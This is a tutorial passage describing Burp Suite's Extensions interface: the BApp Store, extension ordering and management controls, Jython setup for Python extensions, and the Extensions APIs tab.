This can quickly and easily load extensions into the framework, as well as providing a marketplace to download third-party modules (referred to as the "BApp Store") Extensions are invoked in descending order based on this list. In other words: all traffic passing through Burp Suite will be passed through each extension in order, starting at the top of the list and working down. This can be very important when dealing with extensions that modify the requests as some may counteract or otherwise hinder one another.
Towards the bottom of the window, we have Details, Output and Errors for the currently selected module. These can be used to view module information, as well as for debugging.

Beyond the built-in features, the Java codebase of Burp Suite facilitates the development of extensions to enhance the framework's functionality. These extensions can be written in Java, Python (using the Java Jython interpreter), or Ruby (using the Java JRuby interpreter). The Burp Suite Extender module allows for quick and easy loading of extensions into the framework, while the marketplace, known as the BApp Store, enables downloading of third-party modules. While certain extensions may require a professional license for integration, there are still a considerable number of extensions available for Burp Community. For instance, the Logger++ module can extend the built-in logging functionality of Burp Suite.

### The Extensions interface in Burp Suite 
This allows users to manage and monitor the installed extensions, activate or deactivate them for specific projects, and view important details, output, and errors related to each extension. By using extensions, Burp Suite becomes a powerful and customizable platform for various security testing and web application assessment tasks.
Extensions List: The top box displays a list of the extensions that are currently installed in Burp Suite for the current project. It allows you to activate or deactivate individual extensions.
Managing Extensions: On the left side of the Extensions interface, there are options to manage extensions:
    Add: You can use this button to install new extensions from files on your disk. These files can be custom-coded modules or modules obtained from external sources that are not available in the official BApp store.
    Remove: This button allows you to uninstall selected extensions from Burp Suite.
    Up/Down: These buttons control the order in which installed extensions are listed. The order determines the sequence in which extensions are invoked when processing traffic. Extensions are applied in descending order, starting from the top of the list and moving down. The order is essential, especially when dealing with extensions that modify requests, as some may conflict or interfere with others.
    Details: This section provides information about the selected extension, such as its name, version, and description.
    Output: Extensions can produce output during their execution, and this section displays any relevant output or results.
    Errors: If an extension encounters any errors during execution, they will be shown in this section. This can be useful for debugging and troubleshooting extension issues.


In Burp Suite, the BApp Store (Burp App Store) allows us to easily discover and integrate official extensions seamlessly into the tool. Extensions can be written in various languages, with Java and Python being the most common choices. Java extensions integrate automatically with the Burp Suite framework, while Python extensions require the Jython interpreter - To use Python modules in Burp Suite, we need to include the Jython Interpreter JAR file, which is a Java implementation of Python. The Jython Interpreter enables us to run Python-based extensions within Burp Suite.
Download Jython JAR: Visit the Jython website and download the standalone JAR archive. 
Look for the Jython Standalone option. Save the JAR file to a location on your disk.
Configure Jython in Burp Suite: Open Burp Suite and switch to the Extensions module. 
Go to the Extensions settings sub-tab.
Python Environment: Scroll down to the "Python environment" section.
Set Jython JAR Location: In the "Location of Jython standalone JAR file" field, set the path to the downloaded Jython JAR file.
Once you have completed these steps, Jython will be integrated with Burp Suite, allowing you to use Python modules in the tool. This integration significantly increases the number of available extensions and enhances your capabilities in performing various security testing and web application assessment tasks.
In the Burp Suite Extensions module, you have access to a wide range of API endpoints that allow you to create and integrate your modules with Burp Suite. These APIs expose various functionalities, enabling you to extend the capabilities of Burp Suite to suit your specific needs.
To view the available API endpoints, navigate to the APIs sub-tab within the Extensions module. Each item listed in the left-hand panel represents a different API endpoint that can be accessed from within extensions.
The Extensions APIs give developers significant power and flexibility when writing custom extensions. You can use these APIs to seamlessly interact with Burp Suite's existing functionality and tailor your extensions to perform specific tasks.
It's important to note that coding your extensions for Burp Suite can be a complex task, and it goes beyond the scope of this module. However, suppose you are interested in exploring this area further and creating custom extensions. In that case, PortSwigger provides a comprehensive reference that is an excellent resource for developing Burp Suite extensions.
To learn more about Burp Suite extension development and to access the detailed reference, you can visit PortSwigger's official documentation https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension
